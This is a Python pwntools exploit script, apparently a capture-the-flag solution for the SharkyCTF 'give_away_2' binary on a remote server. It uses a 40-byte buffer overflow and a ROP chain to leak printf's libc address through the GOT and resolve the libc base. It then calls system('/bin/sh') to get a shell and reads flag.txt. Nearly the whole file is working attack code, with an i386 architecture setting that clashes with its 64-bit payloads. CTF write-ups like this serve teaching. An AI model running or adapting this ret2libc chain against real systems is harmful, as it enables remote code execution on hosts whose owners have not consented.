#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host sharkyctf.xyz --port 20335
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = context.binary = ELF('./give_away_2')
context.terminal = ['zsh', '-e', 'sh', '-c']
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'sharkyctf.xyz'
port = int(args.PORT or 20335)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    global libc
    if args.LOCAL:
        libc = ELF('/usr/lib/libc.so.6')
        return local(argv, *a, **kw)
    else:
        libc = ELF('./libc-2.27.so')
        return remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break main
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


def send_payload(proc, payload):
    proc.sendline(payload)


io = start()
main = int(io.recvline_startswith(b'Give')[-12:], 0x10)


# calculating the base address for the executable
exe.address = main-exe.sym['main']
rop = ROP(exe)

printf = exe.sym['printf']
printfgot = exe.got['printf']
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
vuln = exe.sym['vuln']

# this is the address of the printf part in main
print_giveaway = exe.address+0x880

payload1 = 40*b'A'
# pops rdi from stack which is printfgot and then returns to print_giveaway

payload1 += p64(pop_rdi) + p64(printfgot) + p64(print_giveaway)
send_payload(io, payload1)

# the returned give away now is printf address in libc
printflibc = unpack(
    io.recv(), 'all', sign=False)

# after the give away is printed vuln gets called so we can send another payload

libc.address = printflibc-libc.sym["printf"]
binsh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]

# we pop rdi from stack which is binsh to pass it to system function
# for some reason I had to call system twice to get it to work on the server
# let me know why in the comments Plz
payload2 = 40*b'A' + p64(pop_rdi) + p64(binsh) + p64(system) + \
    p64(pop_rdi) + p64(binsh) + p64(system)

send_payload(io, payload2)
send_payload(io, "cat flag.txt")

print(io.recv())
